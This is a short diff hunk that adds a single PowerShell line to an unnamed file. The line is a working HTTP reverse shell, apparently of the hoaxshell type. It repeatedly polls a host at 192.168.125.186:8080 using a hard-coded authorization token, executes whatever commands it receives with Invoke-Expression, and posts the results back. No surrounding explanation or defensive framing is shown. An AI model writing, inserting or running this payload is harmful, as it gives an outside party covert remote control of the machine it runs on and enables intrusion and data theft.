@@ -1,0 +1,2 @@
+
+$s='192.168.125.186:8080';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/1c520f18 -Headers @{"Authrization"='1c520f18-ec9268db-03ca892c'};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/ec9268db -Headers @{"Authrization"='1c520f18-ec9268db-03ca892c'}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/03ca892c -Method POST -Headers @{"Authrization"='1c520f18-ec9268db-03ca892c'} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
